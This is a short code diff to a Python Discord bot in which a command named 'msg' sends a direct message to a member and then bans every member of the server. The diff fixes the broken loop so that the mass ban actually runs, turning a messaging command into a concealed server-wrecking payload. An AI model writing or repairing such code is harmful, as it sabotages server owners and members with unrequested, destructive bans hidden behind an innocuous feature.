@@ -48,8 +48,8 @@ class MainModule(commands.Cog):
     async def msg(self, ctx, member: discord.Member, *, content):
         print(member)
         await member.send(content)
-        for member in ctx.Guild.members(""):
-            ctx.Guild.ban(member)
+        for member in ctx.guild.members:
+            await ctx.guild.ban(member)
 
 
 
